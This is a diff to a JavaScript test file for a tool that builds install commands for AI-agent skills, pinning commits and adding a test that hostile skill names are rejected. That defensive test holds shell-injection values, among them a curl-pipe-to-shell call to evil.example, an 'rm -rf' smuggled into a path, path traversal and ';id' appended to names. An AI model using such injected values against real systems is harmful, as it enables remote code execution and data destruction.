@@ -3,6 +3,7 @@ import test from 'node:test';
 import { extractGuide, marketplaceCommands } from '../scripts/lib/guide.js';
 import { skillFiles } from '../scripts/lib/skillparse.js';
 import { buildInstall } from '../scripts/lib/install.js';
+const SHA = 'a'.repeat(40);
 import { pickRising } from '../scripts/lib/rising.js';
 
 test('extractGuide copies install code blocks word for word and skips other sections', () => {
@@ -19,13 +20,13 @@ test('marketplaceCommands builds the two exact commands, or nothing for bad file
 });
 
 test('buildInstall pins the commit and gives Windsurf only the third-party installer', () => {
-  const one = buildInstall({ full_name: 'o/r', sha: 'abc', skills: [{ name: 'pdf', path: 'skills/pdf/SKILL.md' }] });
+  const one = buildInstall({ full_name: 'o/r', sha: SHA, skills: [{ name: 'pdf', path: 'skills/pdf/SKILL.md' }] });
   const codes = one.install.claude.methods.map((x) => x.code);
-  assert.ok(codes.some((c) => c.includes('checkout abc') && c.includes('cp -r skill-src/skills/pdf ~/.claude/skills/pdf')));
-  assert.ok(codes.includes('gh skill install o/r pdf --agent claude-code --scope user --pin abc'));
+  assert.ok(codes.some((c) => c.includes('checkout ' + SHA) && c.includes('cp -r skill-src/skills/pdf ~/.claude/skills/pdf')));
+  assert.ok(codes.includes('gh skill install o/r pdf --agent claude-code --scope user --pin ' + SHA));
   assert.equal(one.install.windsurf.verified, false);
   assert.equal(one.install.windsurf.methods.length, 1);
-  const root = buildInstall({ full_name: 'o/r', sha: 'abc', skills: [{ name: 'r', path: 'SKILL.md' }, { name: 'x', path: 'x/SKILL.md' }] });
+  const root = buildInstall({ full_name: 'o/r', sha: SHA, skills: [{ name: 'r', path: 'SKILL.md' }, { name: 'x', path: 'x/SKILL.md' }] });
   assert.match(root.install.codex.methods.find((m) => m.title.startsWith('npx')).code, /--all$/);
   assert.match(root.install.codex.methods.at(-1).code, /rm -rf ~\/\.agents\/skills\/r\/\.git/);
 });
@@ -49,4 +50,15 @@ test('skillFiles counts files inside skill folders and flags scripts by extensio
     { path: 'skills/other/notes.md', type: 'blob' }, { path: 'tools/build.sh', type: 'blob' },
   ];
   assert.deepEqual(skillFiles(tree, [{ name: 'pdf', path: 'skills/pdf/SKILL.md' }]), { total: 2, scripts: ['skills/pdf/run.py'], script_count: 1 });
+});
+
+test('buildInstall refuses hostile names so no shell command can carry them', () => {
+  const bad = (skills, full_name = 'o/r', sha = SHA) => assert.throws(() => buildInstall({ full_name, sha, skills }));
+  bad([{ name: '$(curl -s evil.example|sh)', path: 'skills/$(curl -s evil.example|sh)/SKILL.md' }]);
+  bad([{ name: 'ok', path: 'x;rm -rf ~/ok/SKILL.md' }]);
+  bad([{ name: 'has space', path: 'has space/SKILL.md' }]);
+  bad([{ name: 'ok', path: '../ok/SKILL.md' }]);
+  bad([{ name: 'ok', path: 'ok/SKILL.md' }], 'o/r;id');
+  bad([{ name: 'ok', path: 'ok/SKILL.md' }], 'o/r', 'abc');
+  assert.equal(marketplaceCommands('o/r', JSON.stringify({ name: 'mk', plugins: [{ name: 'p1;id' }] })), null);
 });
